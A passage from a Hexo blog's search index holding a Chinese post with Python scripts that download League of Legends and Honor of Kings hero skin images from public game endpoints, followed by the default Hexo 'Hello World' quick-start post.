change_name(skin_name)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename+newname+<span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(content)</span><br><span class="line"><span class="built_in">print</span>(skin_name)</span><br><span class="line"></span><br><span class="line">hero_list_url = <span class="string">&quot;https://game.gtimg.cn/images/lol/act/img/js/heroList/hero_list.js?ts=2748291&quot;</span></span><br><span class="line">response = requests.get(url=hero_list_url,headers=headers)</span><br><span class="line">hero_list = response.json()[<span class="string">&#x27;hero&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> hero <span class="keyword">in</span> hero_list:</span><br><span class="line">hero_id = hero[<span class="string">&#x27;heroId&#x27;</span>]</span><br><span class="line">hero_name = hero[<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line">hero_title = hero[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">hero_url = <span class="string">f&quot;https://game.gtimg.cn/images/lol/act/img/js/hero/<span class="subst">&#123;hero_id&#125;</span>.js&quot;</span></span><br><span class="line">response_1 = requests.get(url=hero_url,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(hero_id,hero_name,hero_title)</span><br><span class="line">skin_list = response_1.json()[<span class="string">&#x27;skins&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> skin <span class="keyword">in</span> skin_list:</span><br><span class="line"><span class="keyword">if</span>(skin[<span class="string">&#x27;mainImg&#x27;</span>]):</span><br><span class="line">skin_url = skin[<span class="string">&#x27;mainImg&#x27;</span>]</span><br><span class="line">skin_name = skin[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">save_img(hero_name,hero_title,skin_name,skin_url)</span><br><span class="line"><span class="comment"># print(skin_url)</span></span><br></pre></td></tr></table></figure><p>各个英雄的皮肤会保存在自己的文件下：</p><p><img src="https://s2.loli.net/2022/04/06/LEcIVRNbux1rnDA.png" alt="image-20220406084813906.png"></p><p><img src="https://s2.loli.net/2022/04/06/R4XxZkbLVtwQcHe.png" alt="image-20220406084841993.png"></p><h4 id="王者荣耀英雄皮肤爬取"><a href="#王者荣耀英雄皮肤爬取" class="headerlink" title="王者荣耀英雄皮肤爬取"></a>王者荣耀英雄皮肤爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wzry.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\✩\˚\*\•̩̩͙ʚ]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#各个符号间用转义字符隔开</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_img</span>(<span class="params">name,title,skin_name,skin_url</span>):</span><br><span class="line">filename = <span class="string">f&quot;<span class="subst">&#123;title+name&#125;</span>\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line">content = requests.get(url=skin_url,headers=headers).content</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename+skin_name+<span class="string">&#x27;_&#x27;</span>+name+<span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(content)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">herolist_url = <span class="string">&quot;https://pvp.qq.com/web201605/js/herolist.json&quot;</span></span><br><span class="line">herolist = requests.get(url=herolist_url,headers=headers).json()</span><br><span class="line"><span class="keyword">for</span> hero <span class="keyword">in</span> herolist:</span><br><span class="line">hero_ename = hero[<span class="string">&#x27;ename&#x27;</span>]</span><br><span class="line">hero_name = hero[<span class="string">&#x27;cname&#x27;</span>]</span><br><span class="line">hero_title = hero[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(hero_ename,hero[<span class="string">&#x27;cname&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;skin_name&#x27;</span> <span class="keyword">in</span> hero):</span><br><span class="line">skin_list = hero[<span class="string">&#x27;skin_name&#x27;</span>].split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">hero_url = <span class="string">f&quot;https://pvp.qq.com/web201605/herodetail/<span class="subst">&#123;hero_ename&#125;</span>.shtml&quot;</span></span><br><span class="line">response = requests.get(url=hero_url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding</span><br><span class="line">tu = re.findall(<span class="string">&#x27;&lt;ul class=\&quot;pic-pf-list pic-pf-list3\&quot; data-imgname=\&quot;(.*?)\&amp;0\|(.*?)\&amp;0\|(.*?)\&amp;72\&quot;&gt;&#x27;</span>,response.text)</span><br><span class="line">skin_list = <span class="built_in">list</span>(tu[<span class="number">0</span>])</span><br><span class="line">skin_lens = <span class="built_in">len</span>(skin_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(skin_lens):</span><br><span class="line">skin_url = <span class="string">f&quot;https://game.gtimg.cn/images/yxzj/img201606/heroimg/<span class="subst">&#123;hero_ename&#125;</span>/<span class="subst">&#123;hero_ename&#125;</span>-bigskin-<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>.jpg&quot;</span></span><br><span class="line">skin_name = skin_list[i]</span><br><span class="line">save_img(hero_name,hero_title,skin_name,skin_url)</span><br><span class="line"><span class="built_in">print</span>(skin_name,hero_name)</span><br></pre></td></tr></table></figure><p>文件保存思路与LOL一致：</p><p><img src="https://s2.loli.net/2022/04/06/qpJTLrSeatgcbKk.png" alt="image-20220406085029196.png"></p><p><img src="https://s2.loli.net/2022/04/06/6RMvwCJk37HqOfi.png" alt="image-20220406085046682.png"></p><h4 id="未完待续……"><a href="#未完待续……" class="headerlink" title="未完待续……"></a>未完待续……</h4>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/05/hello-world/"/>
      <url>/2022/04/05/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test1 </tag>
            
            <tag> test2 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
